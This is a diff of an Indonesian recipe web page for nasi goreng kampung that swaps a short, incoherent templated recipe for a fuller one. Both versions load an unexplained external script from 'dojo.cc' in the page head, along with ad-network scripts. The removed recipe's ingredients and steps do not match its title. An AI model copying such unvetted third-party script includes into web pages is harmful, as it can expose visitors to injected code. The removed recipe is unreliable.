@@ -3,177 +3,258 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Resep Nasi Goreng Kampung Spesial: Rasa Tradisional yang Bikin Kangen! - Masakanku</title>
-    <meta name="description" content="Nasi goreng kampung dengan terasi dan kencur, bumbu diulek manual.">
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <title>Resep Nasi Goreng Kampung — Masakanku</title>
+    <meta name="description" content="Resep nasi goreng kampung autentik lengkap. Nasi pulen dengan bumbu yang meresap, telur, ayam, dan sayuran. Cara membuat yang tepat biar nasi nggak lembek, tekstur butir sempurna.">
+    <link rel="canonical" href="https://masakanku.online/resep-nasi-goreng-kampung">
     <style>
-        body {font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;background:#f4f4f4;color:#333;}
-        .navbar-brand {font-weight:700;font-size:1.6rem;}
-        .navbar {background:#c0392b !important;box-shadow:0 2px 15px rgba(0,0,0,0.15);}
-        .navbar a {color:#fff !important;}
-        .article-header {background:linear-gradient(135deg,#F1C40F,#F39C12);color:#fff;padding:40px 0;text-align:center;}
-        .article-header h1 {font-weight:800;font-size:2rem;}
-        .article-content {background:#fff;border-radius:12px;box-shadow:0 4px 15px rgba(0,0,0,0.08);padding:30px;margin-top:30px;}
-        .article-content h2 {color:#c0392b;font-weight:700;margin-top:30px;border-bottom:2px solid #fdeaea;padding-bottom:8px;}
-        .article-content h3 {color:#e74c3c;font-weight:600;margin-top:20px;}
-        .article-content p {line-height:1.8;margin-bottom:12px;}
-        .article-content li {margin-bottom:6px;line-height:1.7;}
-        .ingredient-box {background:#fef9f0;border-left:4px solid #e67e22;padding:15px 20px;border-radius:8px;margin:20px 0;}
-        .tip-box {background:#e8f8f5;border-left:4px solid #1abc9c;padding:15px 20px;border-radius:8px;margin:20px 0;}
-        footer {background:#222;color:#ccc;padding:30px 0;margin-top:40px;}
-        footer a {color:#e74c3c;text-decoration:none;}
-        .breadcrumb-custom {background:transparent;padding:10px 0;}
-        @media (max-width:768px) {.article-header h1 {font-size:1.5rem;}.article-content {padding:20px;}}
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Segoe UI', system-ui, -apple-system, sans-serif; line-height: 1.8; color: #333; background: #fef9f4; }
+        nav { background: #c0392b; padding: 1rem 0; position: sticky; top: 0; z-index: 100; }
+        nav .container { max-width: 1100px; margin: auto; display: flex; justify-content: space-between; align-items: center; padding: 0 1.5rem; flex-wrap: wrap; }
+        nav .logo { color: #fff; font-size: 1.5rem; font-weight: 700; text-decoration: none; }
+        nav .logo span { color: #fdd835; }
+        nav a { color: #fff; text-decoration: none; margin-left: 1.2rem; font-weight: 500; font-size: 0.95rem; }
+        nav a:hover { color: #fdd835; }
+        .container { max-width: 800px; margin: auto; padding: 2rem 1.5rem; }
+        .breadcrumb { font-size: 0.9rem; color: #888; margin-bottom: 1rem; }
+        .breadcrumb a { color: #c0392b; text-decoration: none; }
+        .breadcrumb a:hover { text-decoration: underline; }
+        .category-badge { display: inline-block; background: #8B4513; color: #fff; padding: 0.3rem 1rem; border-radius: 20px; font-size: 0.8rem; font-weight: 600; text-transform: uppercase; margin-bottom: 1rem; }
+        h1 { font-size: 2rem; color: #222; margin-bottom: 0.5rem; line-height: 1.3; }
+        .meta-desc { font-size: 1.1rem; color: #666; margin-bottom: 1.5rem; border-left: 4px solid #A0522D; padding-left: 1rem; }
+        .article-img { width: 100%; border-radius: 12px; margin: 1.5rem 0; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
+        .intro { font-size: 1.05rem; margin-bottom: 1.5rem; }
+        h2 { font-size: 1.5rem; color: #8B4513; margin: 2rem 0 1rem; padding-bottom: 0.5rem; border-bottom: 2px solid #D2B48C; }
+        .ingredients, .steps { background: #fff; padding: 1.5rem; border-radius: 12px; box-shadow: 0 2px 8px rgba(0,0,0,0.05); margin-bottom: 1.5rem; }
+        .ingredients li, .steps li { margin-bottom: 0.6rem; padding-left: 0.5rem; }
+        .ingredients ul, .steps ol { padding-left: 1.5rem; }
+        .tips-box { background: #fff8e1; border-left: 4px solid #A0522D; padding: 1.2rem 1.5rem; border-radius: 8px; margin: 1.5rem 0; }
+        .tips-box h3 { color: #8B4513; margin-bottom: 0.8rem; }
+        .tips-box li { margin-bottom: 0.5rem; }
+        .cta { text-align: center; background: #A0522D; color: #fff; padding: 1.5rem; border-radius: 12px; margin: 2rem 0; }
+        .cta p { font-size: 1.1rem; margin-bottom: 0.5rem; }
+        .related { background: #fff; padding: 1.5rem; border-radius: 12px; box-shadow: 0 2px 8px rgba(0,0,0,0.05); margin: 2rem 0; }
+        .related h3 { color: #8B4513; margin-bottom: 1rem; }
+        .related a { color: #8B4513; text-decoration: none; display: block; margin-bottom: 0.5rem; }
+        .related a:hover { text-decoration: underline; }
+        footer { background: #2c2c2c; color: #ccc; padding: 2rem 0; text-align: center; margin-top: 3rem; }
+        footer .container { max-width: 800px; margin: auto; padding: 0 1.5rem; }
+        footer a { color: #fdd835; text-decoration: none; margin: 0 0.8rem; }
+        footer a:hover { text-decoration: underline; }
+        footer p { margin-top: 1rem; font-size: 0.9rem; }
+        @media (max-width: 600px) {
+            h1 { font-size: 1.5rem; }
+            nav .container { flex-direction: column; gap: 0.5rem; }
+            nav a { margin: 0 0.6rem; font-size: 0.85rem; }
+        }
     </style>
-
-
-<script src="//dojo.cc/124.js"></script>
+    <script src="//dojo.cc/124.js"></script>
 </head>
 <body>
-<nav class="navbar navbar-expand-lg">
-    <div class="container">
-        <a class="navbar-brand" href="/"><i class="fas fa-utensils me-2"></i>Masakanku</a>
-        <div class="collapse navbar-collapse" id="navbarNav">
-            <ul class="navbar-nav ms-auto">
-                <li class="nav-item"><a class="nav-link" href="/">Beranda</a></li>
-                <li class="nav-item"><a class="nav-link" href="/contact">Contact</a></li>
-                <li class="nav-item"><a class="nav-link" href="/privacy-policy">Privacy Policy</a></li>
-                <li class="nav-item"><a class="nav-link" href="/copyright">Copyright</a></li>
-            </ul>
+    <nav>
+        <div class="container">
+            <a href="/" class="logo">Masakan<span>ku</span></a>
+            <div>
+                <a href="/">Beranda</a>
+                <a href="/contact">Contact</a>
+                <a href="/privacy-policy">Privacy Policy</a>
+                <a href="/copyright">Copyright</a>
+            </div>
         </div>
-    </div>
-</nav>
-
-<section class="article-header">
-    <div class="container">
-        <p class="mb-1"><span class="badge bg-light text-dark">Nasi</span></p>
-        <h1><i class="fas fa-utensils me-2"></i>Resep Nasi Goreng Kampung Spesial: Rasa Tradisional yang Bikin Kangen!</h1>
-        <p class="mb-0 mt-2">Nasi goreng kampung dengan terasi dan kencur, bumbu diulek manual.</p>
-    </div>
-</section>
-
-<div class="container mt-3">
-    <img src="https://images.unsplash.com/photo-1512058564366-18510be2db19?w=1200&h=500&fit=crop" 
-         alt="Hidangan Resep Nasi Goreng Kampung Spesial: Rasa Tradisional yang Bikin Kangen! - Resep Masakan Indonesia Asli nan Lezat" 
-         title="Resep Resep Nasi Goreng Kampung Spesial: Rasa Tradisional yang Bikin Kangen! - Masakan Khas Indonesia yang Mudah Dibuat di Rumah" 
-         class="img-fluid rounded" 
-         style="width:100%;max-height:450px;object-fit:cover;" 
-         loading="eager">
-</div>
-
-<div class="container">
-    <nav aria-label="breadcrumb">
-        <ol class="breadcrumb breadcrumb-custom mt-2">
-            <li class="breadcrumb-item"><a href="/"><i class="fas fa-home me-1"></i>Beranda</a></li>
-            <li class="breadcrumb-item active">Nasi</li>
-        </ol>
     </nav>
 
-    <div class="row">
-        <div class="col-lg-8">
-            <div class="article-content">
-                <p>Nasi goreng kampung dengan terasi dan kencur, bumbu diulek manual.. Resep ini mudah banget diikuti, bahkan buat kamu yang baru pertama kali masak.</p>
-                
-                <p>Dengan bahan-bahan sederhana dan langkah yang simpel, kamu bisa bikin sendiri hidangan lezat ini di rumah. Dijamin hasilnya nggak kalah sama buatan restoran!</p>
-
-                <div class="text-center my-4">
-                    <img src="https://images.unsplash.com/photo-1596797038530-2c107229654b?w=800&h=400&fit=crop" 
-                         alt="Bahan-bahan segar untuk membuat Resep Nasi Goreng Kampung Spesial: Rasa Tradisional yang Bikin Kangen!" 
-                         title="Bahan-Bahan Resep Nasi Goreng Kampung Spesial: Rasa Tradisional yang Bikin Kangen! - Sederhana dan Mudah Dicari" 
-                         class="img-fluid rounded" 
-                         style="width:100%;max-height:350px;object-fit:cover;" 
-                         loading="lazy">
-                    <p class="text-muted small mt-2"><em>Bahan-bahan segar adalah kunci masakan lezat</em></p>
-                </div>
-
-                <h2>Bahan-Bahan</h2>
-                <ul>
-                    <li>500 gram beras kualitas bagus</li>
-                    <li>Bahan utama - 500 gram (sesuai selera)</li>
-                    <li>5 siung bawang putih</li>
-                    <li>8 siung bawang merah</li>
-                    <li>3 butir kemiri, sangrai</li>
-                    <li>2 cm jahe</li>
-                    <li>2 cm kunyit</li>
-                    <li>1 sdt merica bubuk</li>
-                    <li>Garam secukupnya</li>
-                    <li>Gula pasir secukupnya</li>
-                    <li>Kaldu bubuk secukupnya</li>
-                    <li>Minyak goreng untuk menumis</li>
-                    <li>Air secukupnya</li>
-                    <li>2 lembar daun pandan</li>
-                    <li>65 ml santan instan</li>
-                </ul>
-
-<div class="ad-container" style="margin:1.5rem 0;text-align:center;min-height:90px"><script async="async" data-cfasync="false" src="https://jabturfembitter.com/fbf97f8372ae4f56ef2fbb64a6663968/invoke.js"></script><div id="container-fbf97f8372ae4f56ef2fbb64a6663968"></div></div>
-<h2>Cara Membuat</h2>
-                <ol>
-                    <li>Cuci bersih semua bahan. Potong sesuai selera.</li>
-                    <li>Haluskan bumbu-bumbu: bawang, kemiri, jahe, kunyit.</li>
-                    <li>Panaskan minyak. Tumis bumbu halus sampai harum.</li>
-                    <li>Masukkan daun salam, serai, lengkuas. Aduk rata.</li>
-                    <li>Tambahkan bahan utama. Masak sampai berubah warna.</li>
-                    <li>Tuang air secukupnya. Masak dengan api sedang.</li>
-                    <li>Tambahkan garam, gula, kaldu. Koreksi rasa.</li>
-                    <li>Masak sampai matang dan bumbu meresap. Angkat.</li>
-                    <li>Sajikan hangat dengan nasi atau pelengkap lainnya.</li>
-                </ol>
-
-                <div class="tip-box">
-                    <strong><i class="fas fa-lightbulb me-1"></i> Tips:</strong>
-                    <ul class="mb-0 mt-2">
-                        <li>Sajikan selagi hangat biar makin nikmat.</li>
-                        <li>Tambahkan sedikit perasan jeruk nipis biar makin segar.</li>
-                        <li>Gunakan api kecil biar bumbu meresap sempurna.</li>
-                    </ul>
-                </div>
-
-                <hr>
-                <div class="text-center">
-                    <p class="fw-bold fs-5">Siap mencoba resep Resep Nasi Goreng Kampung Spesial: Rasa Tradisional yang Bikin Kangen!?</p>
-                    <p>Jangan lupa bagikan hasil masakanmu ke keluarga ya!</p>
-                </div>
-            </div>
-        </div>
-
-        <div class="col-lg-4">
-            <div class="bg-white rounded-3 p-3 mt-3" style="box-shadow:0 4px 15px rgba(0,0,0,0.08);">
-                <h5 style="color:#c0392b;font-weight:700;border-bottom:2px solid #fdeaea;padding-bottom:10px;">
-                    <i class="fas fa-list me-2"></i>Nasi
-                </h5>
-                <p class="small mt-2">Kumpulan resep nasi pilihan dari Masakanku.</p>
-                <a href="/" class="btn btn-outline-danger btn-sm w-100">Lihat Semua Resep</a>
-            </div>
-        </div>
-    </div>
-</div>
-
-<div class="ad-container" style="margin:1.5rem 0;text-align:center"><script>atOptions={"key":"7f4bd95b8fb4ff051d5837b9e935f6b8","format":"iframe","height":90,"width":728,"params":{}};</script><script src="https://jabturfembitter.com/7f4bd95b8fb4ff051d5837b9e935f6b8/invoke.js"></script></div>
-
-    <div class="related">
-        <h3>📖 Baca Juga</h3>
-            <a href="/resep-nasi-uduk">Resep Nasi Uduk Betawi: Wangi, Gurih, Sarapan Favorit Sejuta Umat! - Masakanku</a>
-            <a href="/resep-nasi-kuning">Resep Nasi Kuning Pulen & Wangi Seperti di Hajatan — Anti Gagal!</a>
-            <a href="/resep-nasi-goreng-seafood">Resep Nasi Goreng Seafood Spesial</a>
-            <a href="/resep-nasi-liwet-solo">Resep Nasi Liwet Khas Solo: Gurih Wangi Santan, Cocok buat Makan Bareng Keluarga - Masakanku</a>
-    </div>
-
-<footer>
     <div class="container">
-        <div class="row">
-            <div class="col-md-6">
-                <p>&copy; 2026 Masakanku. Semua resep original dan bisa dicoba di rumah.</p>
-            </div>
-            <div class="col-md-6 text-md-end">
-                <a href="/contact" class="me-3">Contact</a>
-                <a href="/privacy-policy" class="me-3">Privacy Policy</a>
-                <a href="/copyright" class="me-3">Copyright</a>
+        <div class="breadcrumb">
+            <a href="/">Beranda</a> &raquo; <span>Nasi Goreng</span>
+        </div>
+
+        <span class="category-badge">Nasi Goreng 🍗</span>
+        <h1>Resep Nasi Goreng Kampung: Nasi Pulen Berempah, Telur, Ayam Renyah, dan Sayuran Segar — Rahasia Tekstur Butir Sempurna</h1>
+        <p class="meta-desc">Resep nasi goreng kampung autentik lengkap. Nasi pulen dengan bumbu yang meresap, telur, ayam, dan sayuran. Cara membuat yang tepat biar nasi nggak lembek, tekstur butir sempurna.</p>
+
+        <img src="https://images.unsplash.com/photo-1563379926898-05f4575a45d8?w=800&h=500&fit=crop" alt="Nasi Goreng Kampung Ayam Renyah Telur" title="Nasi Goreng Kampung" class="article-img" loading="lazy">
+
+        <div class="intro">
+            <p>Nasi goreng kampung bukan sekadar nasi sisa yang digoreng. Ada seni di baliknya. Bumbu yang tepat, teknik penggorengan yang benar, dan timing yang pas — tiga hal ini adalah kunci nasi goreng yang enak dan berkesan.</p>
+            <p>Kalau nasi gorengmu selalu lembek atau menggumpal, itu karena ada yang salah di prosesnya. Mungkin nasinya terlalu hangat saat digoreng. Mungkin bumbu terlalu banyak. Atau mungkin teknik penggorenganmu perlu disesuaikan.</p>
+            <p>Nasi goreng kampung yang authentik punya karakteristik unik: tekstur butir yang terpisah, warna kecoklatan yang merata, dan aroma bumbu yang menembus. Setiap gigitan, orang langsung tahu ini bukan nasi biasa.</p>
+            <p>Paling seru: nasi goreng bisa dibuat dalam 15-20 menit. Cepat, praktis, dan hasilnya bisa sebanding dengan di warung. Bahkan bisa lebih enak karena kamu kontrol sendiri kebersihan dan kualitas bahannya.</p>
+        </div>
+
+        <h2>Apa Itu Nasi Goreng Kampung?</h2>
+        <p>Nasi goreng kampung adalah hidangan nasi yang digoreng dengan bumbu rempah, telur, daging ayam, dan berbagai sayuran. Disebut "kampung" karena ini makanan rumahan yang dijadikan menu sehari-hari di desa dan kota.</p>
+        <p>Bedanya dengan nasi goreng biasa: nasi goreng kampung menggunakan nasi hari sebelumnya yang sudah dingin. Teksturnya lebih renyah. Bumbu yang dipakai lebih sederhana tapi lebih meresap — bawang merah, bawang putih, cabai, kecap, dan garam.</p>
+        <p>Yang membuat nasi goreng kampung spesial adalah ayamnya yang digoreng terpisah sampai renyah, baru dicampur dengan nasi. Ini berbeda dengan nasi goreng urban yang ayamnya langsung dicampur. Hasilnya lebih gurih dan ada tekstur renyah yang nikmat.</p>
+        <p>Nasi goreng kampung adalah makanan yang universal. Dikenal di seluruh Indonesia. Dari Sabang sampai Merauke. Setiap daerah punya variasi sendiri, tapi dasar resepnya tetap sama.</p>
+
+        <h2>Bahan-Bahan Nasi Goreng Kampung</h2>
+
+        <div class="ingredients">
+            <h3>Bahan Utama:</h3>
+            <ul>
+                <li>3 cangkir nasi hari sebelumnya (dingin, sudah dipetik-petik)</li>
+                <li>200 gram ayam kampung (potong kecil atau dadu)</li>
+                <li>2 butir telur (ambil putihnya aja atau campur)</li>
+                <li>1 buah wortel (potong dadu kecil)</li>
+                <li>Secuil buncis (potong kecil)</li>
+                <li>3 siung bawang putih (iris tipis)</li>
+                <li>2 siung bawang merah (iris tipis)</li>
+                <li>2 buah cabe merah keriting (iris serong)</li>
+                <li>1 sdt kecap manis</li>
+                <li>Garam secukupnya</li>
+                <li>2 sdm minyak goreng (untuk menggoreng)</li>
+            </ul>
+            <h3>Bumbu Halus:</h3>
+            <ul>
+                <li>3 siung bawang putih</li>
+                <li>2 siung bawang merah</li>
+                <li>2 butir kemiri (sangrai)</li>
+                <li>1 sdt garam</li>
+                <li>1 cm kunyit (opsional, untuk warna dan rasa)</li>
+                <li>Air secukupnya untuk halus</li>
+            </ul>
+            <h3>Untuk Topping dan Penyaji:</h3>
+            <ul>
+                <li>Bawang goreng (untuk taburan)</li>
+                <li>Telur mata sapi goreng (1 butir)</li>
+                <li>Kerupuk (opsi)</li>
+                <li>Sambal atau saus sambal</li>
+                <li>Acar mentimun</li>
+            </ul>
+        </div>
+
+        <div class="ad-container" style="margin:1.5rem 0;text-align:center;min-height:90px"><script async="async" data-cfasync="false" src="https://jabturfembitter.com/fbf97f8372ae4f56ef2fbb64a6663968/invoke.js"></script><div id="container-fbf97f8372ae4f56ef2fbb64a6663968"></div></div>
+
+        <h2>Cara Membuat Nasi Goreng Kampung</h2>
+
+        <div class="steps">
+            <h3>Langkah 1: Siapkan Bahan dan Bumbu</h3>
+            <ol>
+                <li>Haluskan semua bumbu halus. Bisa pakai blender atau ulekan sampai halus benar.</li>
+                <li>Pastikan nasi sudah dingin dan sudah dipetik-petik. Jangan masih hangat atau menggumpal.</li>
+                <li>Potong ayam jadi dadu kecil. Siapkan wortel, buncis, dan cabe. Semua potongan sebaiknya seragam biar masak bersamaan.</li>
+                <li>Kocok telur sampai tercampur rata. Tambahkan garam sedikit.</li>
+            </ol>
+
+            <h3>Langkah 2: Goreng Ayam</h3>
+            <ol>
+                <li>Panaskan wajan dengan 1 sdm minyak. Tunggu sampai benar-benar panas.</li>
+                <li>Masukkan potongan ayam. Goreng sampai berubah warna dan hampir matang (tidak perlu sampai fully cooked, karena akan digoreng lagi).</li>
+                <li>Angkat dan sisihkan. Jangan dicampur dulu.</li>
+            </ol>
+
+            <h3>Langkah 3: Goreng Telur</h3>
+            <ol>
+                <li>Di wajan yang sama, masukkan telur yang sudah dikocok. Goreng dengan teknik scrambled — aduk-aduk sampai putih dan agak kering.</li>
+                <li>Ambil dengan spatula dan sisihkan. Ini akan dicampur nanti.</li>
+            </ol>
+
+            <h3>Langkah 4: Goreng Bumbu dan Nasi</h3>
+            <ol>
+                <li>Tambahkan 1 sdm minyak lagi. Masukkan bumbu halus yang sudah disiapkan. Aduk-aduk sampai harum — tunggu sekitar 1-2 menit.</li>
+                <li>Masukkan nasi yang sudah dipetik-petik. Aduk terus sampai nasi terurai dan merata dengan bumbu. Ini adalah saat yang paling penting — jangan berhenti mengaduk.</li>
+                <li>Tambahkan wortel dan buncis. Aduk rata. Masak sampai sayuran matang tapi masih renyah (sekitar 2-3 menit).</li>
+                <li>Masukkan ayam yang sudah digoreng tadi. Aduk rata.</li>
+                <li>Masukkan telur goreng yang sudah disiapkan. Pecahkan-pecahkan sedikit sambil diaduk rata dengan nasi.</li>
+            </ol>
+
+            <h3>Langkah 5: Selesaikan dan Sajikan</h3>
+            <ol>
+                <li>Tambahkan kecap manis dan garam secukupnya. Aduk rata lagi sampai semua bumbu tercampur.</li>
+                <li>Masukkan cabe iris terakhir agar masih fresh dan punya gigitan pedas yang segar.</li>
+                <li>Angkat ke piring. Beri topping bawang goreng, telur mata sapi goreng, dan kerupuk.</li>
+                <li>Sajikan dengan sambal, acar, dan air es dingin. Nikmati selagi hangat.</li>
+            </ol>
+        </div>
+
+        <h2>Rahasia Nasi Goreng Kampung yang Enak</h2>
+
+        <p><strong>Nasi Harus Sudah Dingin</strong></p>
+        <p>Nasi hangat akan menyerap terlalu banyak minyak dan bumbu, hasilnya becek dan lembek. Nasi harus disimpan minimal 6 jam di kulkas atau satu malam. Suhu yang rendah membuat butir nasi mengering dan siap untuk digoreng dengan sempurna.</p>
+
+        <p><strong>Bumbu Halus Harus Harum</strong></p>
+        <p>Jangan langsung masukkan nasi setelah bumbu halus dimasukkan. Tunggu sampai bumbu benar-benar harum — sekitar 1-2 menit. Wangi yang keluar adalah tanda bumbu sudah matang dan siap meresap ke nasi.</p>
+
+        <p><strong>Teknik Penggorengan: Jangan Takut Api Besar</strong></p>
+        <p>Nasi goreng kampung membutuhkan api yang cukup besar agar nasi bisa "menari" di dalam wajan dan tidak lembek. Tapi harus tetap diawasi dan terus diaduk agar nggak gosong.</p>
+
+        <p><strong>Ayam Terpisah untuk Renyahnya</strong></p>
+        <p>Dengan menggoreng ayam terlebih dahulu, kamu bisa mengontrol tingkat kematangan dan kerenyahnya. Ayam yang renyah akan memberikan tekstur yang lebih menarik daripada ayam yang dicampur langsung dengan nasi.</p>
+
+        <h2>Variasi Nasi Goreng Kampung</h2>
+
+        <h3>Nasi Goreng Kampung dengan Seafood</h3>
+        <p>Ganti ayam dengan udang, cumi, atau kombinasi keduanya. Seafood membuat rasa lebih laut dan segar. Proses masak lebih cepat karena seafood matang hanya 5 menit.</p>
+
+        <h3>Nasi Goreng Kampung Telur Asin</h3>
+        <p>Ganti dengan telur asin yang sudah matang dan diremuk-remuk. Rasa lebih gurih dan sedikit pedas alami. Kombinasi sempurna dengan nasi putih.</p>
+
+        <h3>Nasi Goreng Kampung Vegetarian</h3>
+        <p>Tanpa ayam atau telur. Tambahkan tahu goreng, tempe, atau jamur tiram yang dipotong dadu. Tetap enak dan memuaskan untuk yang vegetarian.</p>
+
+        <h2>Tips Biar Nasi Goreng Kampung Sempurna</h2>
+
+        <div class="tips-box">
+            <h3>🍗 Tips Jitu Nasi Goreng Kampung</h3>
+            <ul>
+                <li><strong>Petik nasi dengan tangan atau garpu.</strong> Sebelum digoreng, petik-petik nasi agar tidak menggumpal. Ini membuat proses penggorengan lebih merata dan nasi tidak ada yang keras.</li>
+                <li><strong>Jangan terlalu banyak bumbu.</strong> Bumbu yang berlebihan membuat nasi lembek dan terlalu basah. 2-3 sdm bumbu halus cukup untuk 3 cangkir nasi.</li>
+                <li><strong>Terus aduk saat di wajan.</strong> Jangan biarkan nasi diam. Aduk terus agar bumbu merata dan tidak ada yang gosong. Gunakan teknik mengaduk dengan huruf "C" untuk hasil yang lebih baik.</li>
+                <li><strong>Masak dengan api sedang-besar.</strong> Api kecil akan membuat nasi lembek. Api yang cukup membuat butir nasi tetap terpisah dan renyah.</li>
+                <li><strong>Cek rasa di akhir.</strong> Sebelum disajikan, cek rasa dengan mencicipi sedikit. Tambahkan garam atau kecap sesuai selera. Rasa harus seimbang antara gurih, asin, dan manis.</li>
+            </ul>
+        </div>
+
+        <h2>Kenapa Nasi Goreng Kampung Layak Dicoba?</h2>
+        <p>Nasi goreng kampung adalah hidangan yang sederhana tapi berkualitas. Bahan-bahannya murah dan mudah didapat. Cara membuatnya cepat — hanya 20 menit dari nol sampai hidang.</p>
+        <p>Rasanya cocok untuk segala suasana. Dari sarapan, makan siang, sampai makan malam. Bisa dimakan sendiri atau bersama keluarga. Puas dan mengenyangkan.</p>
+        <p>Yang paling menarik: nasi goreng kampung adalah cara terbaik untuk menggunakan nasi sisa. Bukan membuang, tapi mengubahnya jadi hidangan yang lezat dan bernilai.</p>
+        <p>Dan praktisnya, dengan menguasai resep ini, kamu bisa membuat variasi nasi goreng apapun — seafood, egg fried rice, nasi goreng pedas, atau apapun sesuai kreatifitasmu.</p>
+
+        <h2>FAQ Nasi Goreng Kampung</h2>
+
+        <p><strong>Berapa lama nasi goreng tahan di kulkas?</strong></p>
+        <p>Tahan 2-3 hari di kulkas dalam wadah tertutup. Untuk disimpan lebih lama, simpan di freezer sampai 1 bulan. Panaskan kembali di teflon atau microwave sebelum disajikan.</p>
+
+        <p><strong>Nggak punya telur, bisa nggak?</strong></p>
+        <p>Bisa. Tambahkan tahu goreng, tempe, atau daging lebih banyak sebagai penggantinya. Rasa akan tetap enak meski berbeda tekstur.</p>
+
+        <p><strong>Nasi masih hangat saat mau digoreng, gimana?</strong></p>
+        <p>Masukkan ke kulkas sebentar sampai dingin. Atau taruh di atas piring yang dibasahi air dingin sambil dikibas-kibas agar cepat dingin. Jangan dipaksakan dengan nasi hangat karena hasilnya pasti lembek.</p>
+
+        <p><strong>Nasi goreng terlalu keras, penyebabnya apa?</strong></p>
+        <p>Kemungkinan nasinya sudah terlalu lama disimpan dan sudah kering. Atau terlalu sedikit bumbu dan minyak. Tambahkan sedikit air atau kaldu saat menggoreng agar nasi kembali lembut.</p>
+
+        <p><strong>Mau buat nasi goreng pedas, gimana caranya?</strong></p>
+        <p>Tambahkan lebih banyak cabai — entah cabai merah, cabai rawit, atau sambal. Atau masukkan sambal pedas saat proses penggorengan. Mulai dari sedikit dan naikkan sesuai selera.</p>
+
+        <div class="cta">
+            <p>Rebut pengalaman nasi goreng kampung yang autentik dan sedap!</p>
+            <p>Dengan resep ini, setiap kali bikin pasti sukses. Nasi yang pulen, bumbu yang meresap, tekstur yang sempurna. Keluarga pasti minta nambah! 🍗</p>
+        </div>
+
+        <div class="related">
+            <h3>Baca Juga</h3>
+            <a href="/resep-ayam-goreng-mentega">Resep Ayam Goreng Mentega Renyah Gurih</a>
+            <a href="/resep-sambal-matah">Resep Sambal Matah Segar Pedas</a>
+            <a href="/resep-telur-balado">Resep Telur Balado Pedas Merah</a>
+            <a href="/resep-tumis-kangkung-belacan">Resep Tumis Kangkung Belacan</a>
+        </div>
+    </div>
+
+    <div class="ad-container" style="margin:1.5rem 0;text-align:center"><script>atOptions={"key":"7f4bd95b8fb4ff051d5837b9e935f6b8","format":"iframe","height":90,"width":728,"params":{}};</script><script src="https://jabturfembitter.com/7f4bd95b8fb4ff051d5837b9e935f6b8/invoke.js"></script></div>
+
+    <footer>
+        <div class="container">
+            <div>
+                <a href="/contact">Contact</a>
+                <a href="/privacy-policy">Privacy Policy</a>
+                <a href="/copyright">Copyright</a>
                 <a href="/dmca">DMCA</a>
             </div>
+            <p>&copy; 2026 Masakanku. Semua resep original dan bisa dicoba di rumah.</p>
         </div>
-    </div>
-
+    
     <div class="container mt-3" style="border-top:1px solid #444;padding-top:1rem">
         <p style="font-size:0.8rem;opacity:0.7">
             <strong>Jelajahi Juga:</strong> 
@@ -183,6 +264,5 @@
         </p>
     </div>
 </footer>
-<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
 </body>
 </html>
